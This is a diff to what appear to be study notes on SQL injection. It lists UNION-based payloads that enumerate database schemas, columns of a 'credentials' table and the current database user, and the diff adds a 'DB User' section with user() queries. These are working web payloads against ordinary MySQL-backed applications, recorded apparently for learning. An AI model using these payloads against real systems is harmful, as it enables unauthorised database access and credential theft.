@@ -49,4 +49,12 @@ Reminder: We are adding an extra dash (-) at the end, to show you that there is 
 - `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`
 - `cn' UNION select 1,database(),2,3-- -`
 - `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`  : This payload gives us the information regarding the column name, table name and table schema of the tables
-- 
+
+## DB User
+```
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+```
+
+Injection payload will be : `value' UNION SELECT 1, user(), 3, 4-- -`
